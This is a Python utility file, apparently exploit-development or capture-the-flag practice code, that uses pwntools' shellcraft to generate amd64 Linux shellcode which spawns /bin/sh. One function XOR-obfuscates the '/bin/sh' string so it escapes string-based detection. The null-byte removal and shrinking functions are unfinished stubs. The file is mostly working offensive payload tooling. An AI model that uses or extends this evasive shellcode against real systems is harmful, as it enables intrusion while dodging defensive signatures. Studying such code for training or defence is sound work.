from pwnlib import shellcraft

newline = "\n"

################################################################
# This just returns the original shellcraft shellcode
################################################################
def sh():
    return shellcraft.amd64.linux.sh()

################################################################
# This extracts the /bin/sh string, xor's it with an arbitrary 
# value. This value which doesn't contain /bin/sh is used to 
# construct new equivalent instruction to replace the instruction
# that contained the /bin/sh string in the first place
################################################################
def nobinsh():

    mixer = "0x0202020202020202"    
    space = "    "

    raw = shellcraft.amd64.linux.sh()
    comment_line = raw[:-219]
    binsh_line = raw[50:-173]
    binsh = binsh_line[9:]
    binsh = str(hex((int(binsh, 16) ^  int(mixer,16))))

    mangled_binsh = "mov rbx, " + binsh + newline
    mangled_binsh += space + "mov rax, " + mixer + newline
    mangled_binsh += space + "xor rax, rbx"
  
    raw = raw.replace(binsh_line, mangled_binsh)
    return raw 

################################################################
# TODO: This removes all null values in the shell code. This is a 
# tough problem and more time is needed for a strategy. Usually
# instruction swith constant operands are the source of nulls,
# figuring out how to replace these instructions is non-trivial.
################################################################
def nonull(src):
    index = 0
    instr = " "
    operand = " "
    hasmov = False
    haspush = False
    hasrsp = False
    haspop = False

    lines = src.splitlines()
    #print(lines) 

    for line in lines:
        tokens = line.split()
        for word in tokens:
            if ("0x" in word ) or  word.isnumeric() or ("rsp" in word) or ("pop" in word):
                if "mov" in line:
                    #print("move instruction")
                    #print(line)
                    hasmov = True
                if "push" in line: 
                    #print("push instruction")
                    #print(line) 
                    haspush = True
                if "rsp" in line:
                    #print("rsp as operand instruction")
                    #print(line)  
                    hasrsp = True 
                if "pop" in line:
                    #print("pop instruction")
                    #print(line)     
                    haspop = True             

    dest = src
    return dest

################################################################
# TODO: This attempts to shrink the shellcode to at most length
# len bytes.
################################################################
def compact(len):
    return shellcraft.amd64.linux.sh()